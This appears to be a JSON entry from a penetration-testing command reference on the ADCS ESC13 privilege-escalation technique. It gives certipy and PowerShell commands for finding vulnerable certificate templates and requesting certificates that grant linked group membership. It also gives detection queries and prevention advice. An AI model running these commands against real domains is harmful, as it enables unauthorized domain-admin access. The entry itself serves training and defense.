@@ -1,0 +1,95 @@
+{
+  "id": "ad-adcs-esc13-issuance-policy",
+  "name": "ADCS ESC13 - Issuance Policy OID Group Link",
+  "command": "certipy req -u <user>@<domain> -p <pass> -ca <ca_name> -template <vuln_template> -dc-ip <dc_ip>",
+  "description": "ESC13 exploits a certificate template with an issuance policy OID that is linked to a universal or domain local group via the msDS-OIDToGroupLink attribute. When a certificate with this policy is issued, the authenticating user temporarily gains membership of that linked group. If the linked group is privileged (e.g., Domain Admins), requesting the certificate grants domain admin access.",
+  "platform": "linux",
+  "type": "attack-chain",
+  "opsec": "moderate",
+  "category": "Active Directory",
+  "subcategory": "ADCS Abuse",
+  "certifications": [
+    "CRTP",
+    "CPTS"
+  ],
+  "primary_cert": "CRTP",
+  "source": "Jonas Buelow / TrustedSec ESC13 research",
+  "tags": [
+    "adcs",
+    "esc13",
+    "issuance-policy",
+    "oid-group-link",
+    "certificate-template"
+  ],
+  "mitre": [
+    "T1649"
+  ],
+  "exam": "exam-ok",
+  "notes": "=== CONDITIONS ===\n1. A certificate template has an issuance policy OID\n2. That OID has msDS-OIDToGroupLink pointing to a privileged group\n3. You can enroll in the template\n\n=== FIND VULNERABLE TEMPLATES ===\n  certipy find -u <user>@<domain> -p <pass> -dc-ip <dc_ip> -stdout -vulnerable\n  # Look for \"ESC13\" in output\n\n=== EXPLOIT ===\n  certipy req -u <user>@<domain> -p <pass> -ca <ca_name> -template <vuln_template> -dc-ip <dc_ip>\n  certipy auth -pfx <user>.pfx -dc-ip <dc_ip>\n\n=== MANUAL CHECK ===\n  # Find OIDs with group links\n  Get-ADObject -SearchBase \"CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=<domain_short>,DC=local\" -Filter {msDS-OIDToGroupLink -like \"*\"} -Properties msDS-OIDToGroupLink,displayName\n\n=== WHY IT WORKS ===\nThe certificate issuance policy embeds a specific OID in the cert.\nDuring authentication, the DC resolves the OID to a group via\nmsDS-OIDToGroupLink and adds the group to the users token.",
+  "examples": [
+    {
+      "label": "Find ESC13 vulnerable templates",
+      "command": "certipy find -u jdoe@corp.local -p Password123 -dc-ip 192.168.1.10 -stdout -vulnerable"
+    },
+    {
+      "label": "Request certificate with issuance policy",
+      "command": "certipy req -u jdoe@corp.local -p Password123 -ca corp-CA -template PolicyTemplate -dc-ip 192.168.1.10"
+    },
+    {
+      "label": "Find OIDs with group links (PowerShell)",
+      "command": "Get-ADObject -SearchBase \"CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=local\" -Filter {msDS-OIDToGroupLink -like \"*\"} -Properties msDS-OIDToGroupLink,displayName"
+    }
+  ],
+  "references": [
+    {
+      "title": "TrustedSec ESC13 Research",
+      "url": "https://trustedsec.com/blog/adcs-esc13-abuse-technique"
+    },
+    {
+      "title": "Certipy ESC13 Support",
+      "url": "https://github.com/ly4k/Certipy"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "ad-esc1-certipy-linux",
+      "note": "ESC1 is template misconfiguration; ESC13 targets policy-to-group linking.",
+      "rel": "alternative"
+    }
+  ],
+  "defense": {
+    "why_it_works": "The msDS-OIDToGroupLink attribute creates a hidden group membership path through certificate issuance policies. The DC adds the linked group to the authentication token when a cert with that policy is presented.",
+    "prerequisites": "Enrollment access to a template with an issuance policy whose OID has msDS-OIDToGroupLink to a privileged group.",
+    "impact": "Effective membership in the linked group (potentially Domain Admins) during certificate-based authentication.",
+    "detection": "[MITRE T1649] Certificate enrollment in templates with issuance policies; unexpected group memberships in Kerberos tickets.",
+    "artifacts": "Event 4886/4887 (cert request/issue); unusual group SIDs in TGT; msDS-OIDToGroupLink attribute values.",
+    "splunk_spl": "index=windows EventCode=4887\n| search CertificateTemplate=\"*Policy*\"\n| table _time, SubjectUserName, CertificateTemplate, Requester",
+    "elastic_kql": "event.code:\"4887\" AND winlog.event_data.CertificateTemplate:*Policy*",
+    "sentinel_kql": "SecurityEvent\n| where EventID == 4887\n| project TimeGenerated, SubjectUserName, CertificateTemplate, Requester",
+    "sigma_rules": "win_security_adcs_esc13_policy_enrollment",
+    "prevention": "Audit msDS-OIDToGroupLink attributes in AD; remove unnecessary OID-to-group links; restrict enrollment on templates with issuance policies; monitor for ESC13 in certipy/bloodhound scans.",
+    "sources": [
+      "TrustedSec research",
+      "https://attack.mitre.org/techniques/T1649/"
+    ],
+    "detections": [
+      {
+        "platform": "sentinel",
+        "name": "ESC13 - Certificate enrollment with OID group link",
+        "logic": "SecurityEvent\n| where EventID == 4887\n| join kind=inner (\n    SecurityEvent | where EventID == 4768 and PreAuthType == \"16\"\n) on $left.SubjectUserName == $right.TargetUserName\n| project CertIssueTime=TimeGenerated, AuthTime=TimeGenerated1, User=SubjectUserName, Template=CertificateTemplate",
+        "data_source": "windows-security",
+        "log_ids": [
+          "4887",
+          "4768"
+        ],
+        "attack": [
+          "T1649"
+        ],
+        "fidelity": "behavioral",
+        "confidence": "medium",
+        "false_positives": "Legitimate use of issuance policy templates",
+        "tuning": "Alert only when the OID is linked to privileged groups"
+      }
+    ]
+  }
+}
